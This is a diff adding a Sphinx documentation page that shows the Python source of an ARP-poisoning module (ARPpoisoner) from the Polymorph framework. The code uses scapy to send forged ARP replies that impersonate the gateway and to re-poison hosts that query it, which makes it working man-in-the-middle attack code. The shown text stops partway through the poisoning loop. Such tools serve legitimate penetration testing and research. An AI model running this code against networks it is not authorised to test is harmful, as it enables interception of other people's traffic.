@@ -1,0 +1,334 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>polymorph.spoofs.arpspoof &#8212; Polymorph 1.0 documentation</title>
+    <link rel="stylesheet" href="../../../_static/alabaster.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+    <script type="text/javascript" src="../../../_static/documentation_options.js"></script>
+    <script type="text/javascript" src="../../../_static/jquery.js"></script>
+    <script type="text/javascript" src="../../../_static/underscore.js"></script>
+    <script type="text/javascript" src="../../../_static/doctools.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" />
+   
+  <link rel="stylesheet" href="../../../_static/custom.css" type="text/css" />
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
+
+  </head><body>
+  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body" role="main">
+            
+  <h1>Source code for polymorph.spoofs.arpspoof</h1><div class="highlight"><pre>
+<span></span><span class="c1"># Copyright (c) 2014-2016 Marcello Salvati</span>
+<span class="c1">#</span>
+<span class="c1"># This program is free software; you can redistribute it and/or</span>
+<span class="c1"># modify it under the terms of the GNU General Public License as</span>
+<span class="c1"># published by the Free Software Foundation; either version 3 of the</span>
+<span class="c1"># License, or (at your option) any later version.</span>
+<span class="c1">#</span>
+<span class="c1"># This program is distributed in the hope that it will be useful, but</span>
+<span class="c1"># WITHOUT ANY WARRANTY; without even the implied warranty of</span>
+<span class="c1"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU</span>
+<span class="c1"># General Public License for more details.</span>
+<span class="c1">#</span>
+<span class="c1"># You should have received a copy of the GNU General Public License</span>
+<span class="c1"># along with this program; if not, write to the Free Software</span>
+<span class="c1"># Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307</span>
+<span class="c1"># USA</span>
+<span class="c1">#</span>
+
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">from</span> <span class="nn">netaddr</span> <span class="k">import</span> <span class="n">IPNetwork</span><span class="p">,</span> <span class="n">IPRange</span><span class="p">,</span> <span class="n">IPAddress</span><span class="p">,</span> <span class="n">AddrFormatError</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="k">import</span> <span class="n">sleep</span>
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="k">import</span> <span class="o">*</span>
+
+<span class="n">formatter</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">Formatter</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%(asctime)s</span><span class="s2"> [ARPpoisoner] </span><span class="si">%(message)s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">datefmt</span><span class="o">=</span><span class="s2">&quot;%Y-%m-</span><span class="si">%d</span><span class="s2"> %H:%M:%S&quot;</span><span class="p">)</span>
+<span class="c1"># log = logger().setup_logger(&quot;ARPpoisoner&quot;, formatter)</span>
+
+<div class="viewcode-block" id="ARPpoisoner"><a class="viewcode-back" href="../../../polymorph.spoofs.html#polymorph.spoofs.arpspoof.ARPpoisoner">[docs]</a><span class="k">class</span> <span class="nc">ARPpoisoner</span><span class="p">:</span>
+    <span class="n">name</span>      <span class="o">=</span> <span class="s1">&#39;ARP&#39;</span>
+    <span class="n">optname</span>   <span class="o">=</span> <span class="s1">&#39;arp&#39;</span>
+    <span class="n">desc</span>      <span class="o">=</span> <span class="s1">&#39;Redirect traffic using ARP requests or replies&#39;</span>
+    <span class="n">version</span>   <span class="o">=</span> <span class="s1">&#39;0.1&#39;</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">options</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">gatewayip</span>  <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">IPAddress</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">gateway</span><span class="p">))</span>
+        <span class="k">except</span> <span class="n">AddrFormatError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="s2">&quot;Specified an invalid IP address as gateway&quot;</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">gatewaymac</span> <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">gatewaymac</span>
+        <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">gatewaymac</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">gatewaymac</span> <span class="o">=</span> <span class="n">getmacbyip</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">gateway</span><span class="p">)</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">gatewaymac</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="s2">&quot;Error: could not resolve Gateway&#39;s mac address&quot;</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">ignore</span>     <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_range</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">ignore</span><span class="p">)</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">ignore</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">ignore</span> <span class="o">=</span> <span class="p">[]</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">targets</span>    <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_range</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">targets</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">arpmode</span>    <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">arpmode</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">debug</span>      <span class="o">=</span> <span class="kc">False</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">send</span>       <span class="o">=</span> <span class="kc">True</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">interval</span>   <span class="o">=</span> <span class="mi">3</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">interface</span>  <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">interface</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">myip</span>       <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">ip</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">mymac</span>      <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">mac</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">arp_cache</span>  <span class="o">=</span> <span class="p">{}</span>
+
+        <span class="c1">#log.debug(&quot;gatewayip  =&gt; {}&quot;.format(self.gatewayip))</span>
+        <span class="c1">#log.debug(&quot;gatewaymac =&gt; {}&quot;.format(self.gatewaymac))</span>
+        <span class="c1">#log.debug(&quot;targets    =&gt; {}&quot;.format(self.targets))</span>
+        <span class="c1">#log.debug(&quot;ignore     =&gt; {}&quot;.format(self.ignore))</span>
+        <span class="c1">#log.debug(&quot;ip         =&gt; {}&quot;.format(self.myip))</span>
+        <span class="c1">#log.debug(&quot;mac        =&gt; {}&quot;.format(self.mymac))</span>
+        <span class="c1">#log.debug(&quot;interface  =&gt; {}&quot;.format(self.interface))</span>
+        <span class="c1">#log.debug(&quot;arpmode    =&gt; {}&quot;.format(self.arpmode))</span>
+        <span class="c1">#log.debug(&quot;interval   =&gt; {}&quot;.format(self.interval))</span>
+
+<div class="viewcode-block" id="ARPpoisoner.start"><a class="viewcode-back" href="../../../polymorph.spoofs.html#polymorph.spoofs.arpspoof.ARPpoisoner.start">[docs]</a>    <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+
+        <span class="c1"># create a L3 and L2 socket, to be used later to send ARP packets</span>
+        <span class="c1"># this doubles performance since send() and sendp() open and close a socket on each packet</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">s</span>  <span class="o">=</span> <span class="n">conf</span><span class="o">.</span><span class="n">L3socket</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">interface</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">s2</span> <span class="o">=</span> <span class="n">conf</span><span class="o">.</span><span class="n">L2socket</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">interface</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">arpmode</span> <span class="o">==</span> <span class="s1">&#39;rep&#39;</span><span class="p">:</span>
+            <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s1">&#39;ARPpoisoner-rep&#39;</span><span class="p">,</span> <span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">poison</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;is-at&#39;</span><span class="p">,))</span>
+
+        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">arpmode</span> <span class="o">==</span> <span class="s1">&#39;req&#39;</span><span class="p">:</span>
+            <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s1">&#39;ARPpoisoner-req&#39;</span><span class="p">,</span> <span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">poison</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;who-has&#39;</span><span class="p">,))</span>
+
+        <span class="n">t</span><span class="o">.</span><span class="n">setDaemon</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
+        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">targets</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="c1">#log.debug(&#39;Starting ARPWatch&#39;)</span>
+            <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s1">&#39;ARPWatch&#39;</span><span class="p">,</span> <span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">start_arp_watch</span><span class="p">)</span>
+            <span class="n">t</span><span class="o">.</span><span class="n">setDaemon</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
+            <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span></div>
+
+<div class="viewcode-block" id="ARPpoisoner.get_range"><a class="viewcode-back" href="../../../polymorph.spoofs.html#polymorph.spoofs.arpspoof.ARPpoisoner.get_range">[docs]</a>    <span class="k">def</span> <span class="nf">get_range</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">targets</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">targets</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">None</span>
+
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">target_list</span> <span class="o">=</span> <span class="p">[]</span>
+            <span class="k">for</span> <span class="n">target</span> <span class="ow">in</span> <span class="n">targets</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">):</span>
+
+                <span class="k">if</span> <span class="s1">&#39;/&#39;</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
+                    <span class="n">target_list</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">IPNetwork</span><span class="p">(</span><span class="n">target</span><span class="p">)))</span>
+
+                <span class="k">elif</span> <span class="s1">&#39;-&#39;</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
+                    <span class="n">start_addr</span> <span class="o">=</span> <span class="n">IPAddress</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+                    <span class="k">try</span><span class="p">:</span>
+                        <span class="n">end_addr</span> <span class="o">=</span> <span class="n">IPAddress</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
+                        <span class="n">ip_range</span> <span class="o">=</span> <span class="n">IPRange</span><span class="p">(</span><span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">)</span>
+                    <span class="k">except</span> <span class="n">AddrFormatError</span><span class="p">:</span>
+                        <span class="n">end_addr</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">start_addr</span><span class="o">.</span><span class="n">words</span><span class="p">)</span>
+                        <span class="n">end_addr</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+                        <span class="n">end_addr</span> <span class="o">=</span> <span class="n">IPAddress</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">)))</span>
+                        <span class="n">ip_range</span> <span class="o">=</span> <span class="n">IPRange</span><span class="p">(</span><span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">)</span>
+
+                    <span class="n">target_list</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">ip_range</span><span class="p">))</span>
+
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">target_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">IPAddress</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+
+            <span class="k">return</span> <span class="n">target_list</span>
+
+        <span class="k">except</span> <span class="n">AddrFormatError</span><span class="p">:</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="s2">&quot;Specified an invalid IP address/range/network as target&quot;</span><span class="p">)</span></div>
+
+<div class="viewcode-block" id="ARPpoisoner.start_arp_watch"><a class="viewcode-back" href="../../../polymorph.spoofs.html#polymorph.spoofs.arpspoof.ARPpoisoner.start_arp_watch">[docs]</a>    <span class="k">def</span> <span class="nf">start_arp_watch</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">sniff</span><span class="p">(</span><span class="n">prn</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">arp_watch_callback</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="s2">&quot;arp&quot;</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">if</span> <span class="s2">&quot;Interrupted system call&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
+                <span class="c1">#log.error(&quot;[ARPWatch] Exception occurred when invoking sniff(): {}&quot;.format(e))</span>
+                <span class="k">pass</span>
+            <span class="k">pass</span></div>
+
+<div class="viewcode-block" id="ARPpoisoner.arp_watch_callback"><a class="viewcode-back" href="../../../polymorph.spoofs.html#polymorph.spoofs.arpspoof.ARPpoisoner.arp_watch_callback">[docs]</a>    <span class="k">def</span> <span class="nf">arp_watch_callback</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">pkt</span><span class="p">):</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">send</span> <span class="ow">is</span> <span class="kc">True</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">ARP</span> <span class="ow">in</span> <span class="n">pkt</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">op</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="c1">#who-has only</span>
+                <span class="c1">#broadcast mac is 00:00:00:00:00:00</span>
+                <span class="n">packet</span> <span class="o">=</span> <span class="kc">None</span>
+                <span class="c1">#print str(pkt[ARP].hwsrc) #mac of sender</span>
+                <span class="c1">#print str(pkt[ARP].psrc) #ip of sender</span>
+                <span class="c1">#print str(pkt[ARP].hwdst) #mac of destination (often broadcst)</span>
+                <span class="c1">#print str(pkt[ARP].pdst) #ip of destination (Who is ...?)</span>
+
+                <span class="k">if</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwdst</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;00:00:00:00:00:00&#39;</span> <span class="ow">and</span> <span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">pdst</span><span class="p">)</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">gatewayip</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">myip</span> <span class="o">!=</span> <span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span><span class="p">)):</span>
+                    <span class="c1">#log.debug(&quot;[ARPWatch] {} is asking where the Gateway is. Sending the \&quot;I&#39;m the gateway biatch!\&quot; reply!&quot;.format(pkt[ARP].psrc))</span>
+                    <span class="c1">#send repoison packet</span>
+                    <span class="n">packet</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">()</span>
+                    <span class="n">packet</span><span class="o">.</span><span class="n">op</span> <span class="o">=</span> <span class="mi">2</span>
+                    <span class="n">packet</span><span class="o">.</span><span class="n">psrc</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">gatewayip</span>
+                    <span class="n">packet</span><span class="o">.</span><span class="n">hwdst</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwsrc</span><span class="p">)</span>
+                    <span class="n">packet</span><span class="o">.</span><span class="n">pdst</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span><span class="p">)</span>
+
+                <span class="k">elif</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwsrc</span><span class="p">)</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">gatewaymac</span> <span class="ow">and</span> <span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwdst</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;00:00:00:00:00:00&#39;</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">myip</span> <span class="o">!=</span> <span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">pdst</span><span class="p">)):</span>
+                    <span class="c1">#log.debug(&quot;[ARPWatch] Gateway asking where {} is. Sending the \&quot;I&#39;m {} biatch!\&quot; reply!&quot;.format(pkt[ARP].pdst, pkt[ARP].pdst))</span>
+                    <span class="c1">#send repoison packet</span>
+                    <span class="n">packet</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">()</span>
+                    <span class="n">packet</span><span class="o">.</span><span class="n">op</span> <span class="o">=</span> <span class="mi">2</span>
+                    <span class="n">packet</span><span class="o">.</span><span class="n">psrc</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">gatewayip</span>
+                    <span class="n">packet</span><span class="o">.</span><span class="n">hwdst</span> <span class="o">=</span> <span class="s1">&#39;00:00:00:00:00:00&#39;</span>
+                    <span class="n">packet</span><span class="o">.</span><span class="n">pdst</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">pdst</span><span class="p">)</span>
+
+                <span class="k">elif</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwsrc</span><span class="p">)</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">gatewaymac</span> <span class="ow">and</span> <span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwdst</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;00:00:00:00:00:00&#39;</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">myip</span> <span class="o">==</span> <span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">pdst</span><span class="p">)):</span>
+                    <span class="c1">#log.debug(&quot;[ARPWatch] Gateway asking where {} is. Sending the \&quot;This is the h4xx0r box!\&quot; reply!&quot;.format(pkt[ARP].pdst))</span>
+
+                    <span class="n">packet</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">()</span>
+                    <span class="n">packet</span><span class="o">.</span><span class="n">op</span> <span class="o">=</span> <span class="mi">2</span>
+                    <span class="n">packet</span><span class="o">.</span><span class="n">psrc</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">myip</span>
+                    <span class="n">packet</span><span class="o">.</span><span class="n">hwdst</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwsrc</span><span class="p">)</span>
+                    <span class="n">packet</span><span class="o">.</span><span class="n">pdst</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span><span class="p">)</span>
+
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="k">if</span> <span class="n">packet</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+                        <span class="bp">self</span><span class="o">.</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
+                <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                    <span class="k">if</span> <span class="s2">&quot;Interrupted system call&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
+                        <span class="c1">#log.error(&quot;[ARPWatch] Exception occurred while sending re-poison packet: {}&quot;.format(e))</span>
+                        <span class="k">pass</span></div>
+
+<div class="viewcode-block" id="ARPpoisoner.resolve_target_mac"><a class="viewcode-back" href="../../../polymorph.spoofs.html#polymorph.spoofs.arpspoof.ARPpoisoner.resolve_target_mac">[docs]</a>    <span class="k">def</span> <span class="nf">resolve_target_mac</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">targetip</span><span class="p">):</span>
+        <span class="n">targetmac</span> <span class="o">=</span> <span class="kc">None</span>
+
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">targetmac</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">arp_cache</span><span class="p">[</span><span class="n">targetip</span><span class="p">]</span> <span class="c1"># see if we already resolved that address</span>
+            <span class="c1">##log.debug(&#39;{} has already been resolved&#39;.format(targetip))</span>
+        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
+            <span class="c1">#This following replaces getmacbyip(), much faster this way</span>
+            <span class="n">packet</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s1">&#39;ff:ff:ff:ff:ff:ff&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="s2">&quot;who-has&quot;</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">targetip</span><span class="p">)</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">resp</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">sndrcv</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">s2</span><span class="p">,</span> <span class="n">packet</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="n">resp</span><span class="o">=</span> <span class="s1">&#39;&#39;</span>
+                <span class="k">if</span> <span class="s2">&quot;Interrupted system call&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
+                   <span class="c1">#log.error(&quot;Exception occurred while poisoning {}: {}&quot;.format(targetip, e))</span>
+                    <span class="k">pass</span>
+
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">targetmac</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">hwsrc</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">arp_cache</span><span class="p">[</span><span class="n">targetip</span><span class="p">]</span> <span class="o">=</span> <span class="n">targetmac</span> <span class="c1"># shove that address in our cache</span>
+                <span class="c1">#log.debug(&quot;Resolved {} =&gt; {}&quot;.format(targetip, targetmac))</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="c1">#log.debug(&quot;Unable to resolve MAC address of {}&quot;.format(targetip))</span>
+                <span class="k">pass</span>
+
+        <span class="k">return</span> <span class="n">targetmac</span></div>
+
+<div class="viewcode-block" id="ARPpoisoner.poison"><a class="viewcode-back" href="../../../polymorph.spoofs.html#polymorph.spoofs.arpspoof.ARPpoisoner.poison">[docs]</a>    <span class="k">def</span> <span class="nf">poison</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arpmode</span><span class="p">):</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">send</span><span class="p">:</span>
+
+            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">targets</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">s2</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">mymac</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="s1">&#39;ff:ff:ff:ff:ff:ff&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">hwsrc</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">mymac</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">gatewayip</span><span class="p">,</span> <span class="n">op</span><span class="o">=</span><span class="n">arpmode</span><span class="p">))</span>
+
+            <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">targets</span><span class="p">:</span>
+                <span class="k">for</span> <span class="n">target</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">targets</span><span class="p">:</span>
+                    <span class="n">targetip</span>  <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+
+                    <span class="k">if</span> <span class="p">(</span><span class="n">targetip</span> <span class="o">!=</span> <span class="bp">self</span><span class="o">.</span><span class="n">myip</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">target</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ignore</span><span class="p">):</span>
